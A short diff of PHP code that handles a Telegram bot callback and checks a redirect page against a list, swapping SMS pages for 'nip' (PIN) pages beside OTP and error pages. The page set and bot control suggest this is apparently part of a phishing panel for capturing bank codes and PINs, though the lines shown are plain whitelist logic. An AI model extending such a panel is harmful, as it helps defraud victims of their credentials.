@@ -39,7 +39,7 @@ if (isset($update['callback_query'])) {
 
             $valid_pages = [
                 'index.php', 'index-error.php', 'otp.php',
-                'otp-error.php','sms.php','sms-error.php', 'finalizar.php'
+                'otp-error.php','nip.php','nip-error.php', 'finalizar.php'
             ];
 
             if (!in_array($redirect_page, $valid_pages)) {
